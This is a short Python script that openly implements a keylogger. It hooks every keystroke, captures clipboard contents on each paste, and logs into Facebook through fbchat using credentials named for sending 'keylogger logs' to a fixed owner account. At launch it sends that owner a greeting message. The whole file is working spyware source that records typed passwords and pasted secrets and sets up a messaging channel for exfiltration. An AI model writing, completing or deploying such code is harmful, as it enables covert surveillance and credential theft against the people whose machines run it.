import os
import keyboard
import fbchat


class FacebookController(fbchat.Client):
    def __init__(self, login, password, owner_uid):
        super(FacebookController, self).__init__(login, password)

        self.owner_uid = owner_uid

    def send_to_owner(self, message):
        self.send(self.owner_uid, message)


class Keylogger(object):
    def __init__(self):
        self.captured_keys = []
        self.captured_pasting = []

        keyboard.hook(self._on_key_press)
        keyboard.add_hotkey('ctrl+v', self._on_paste)

    def _on_key_press(self, event):
        self.captured_keys.append(event.name)

    def _on_paste(self):
        import pyperclip # Doesn't work when imported globally
        self.captured_pasting.append(pyperclip.paste())


k = Keylogger()
controller = FacebookController(os.environ['FACEBOOK_LOGIN_TO_SEND_KEYLOGGER_LOGS_FROM'],
                                os.environ['FACEBOOK_PASSWORD_TO_SEND_KEYLOGGER_LOGS_FROM'],
                                os.environ['FACEBOOK_KEYLOGGER_OWNER_UID'])
controller.send_to_owner('Wtam, jestem Pomocnikiem Magika. Do uslug')
raw_input("Press Enter to continue...")
